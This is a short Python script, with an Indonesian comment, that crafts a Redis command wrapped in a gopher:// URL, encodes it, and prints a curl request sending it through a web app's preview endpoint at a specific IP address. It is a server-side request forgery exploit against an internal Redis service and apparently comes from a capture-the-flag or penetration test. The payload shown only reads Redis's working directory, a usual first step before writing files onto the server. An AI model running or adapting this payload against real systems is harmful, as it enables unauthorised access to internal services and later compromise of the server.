import base64, urllib.parse

def redis_cmd(*args):
    parts = list(args)
    payload = f"*{len(parts)}\r\n"
    for p in parts:
        payload += f"${len(p)}\r\n{p}\r\n"
    return payload

# Coba CONFIG GET dir dulu buat mastiin working directory
gopher_payload = ""
gopher_payload += redis_cmd("CONFIG", "GET", "dir")
gopher_payload += redis_cmd("QUIT")

encoded = urllib.parse.quote(gopher_payload, safe='')
gopher_url = f"gopher://redis:6379/_{encoded}"
short = base64.urlsafe_b64encode(gopher_url.encode()).decode().rstrip("=")

print(f"curl -s 'http://23.239.30.114:8081/api/preview?url=http://localhost:5000/l/{short}'")
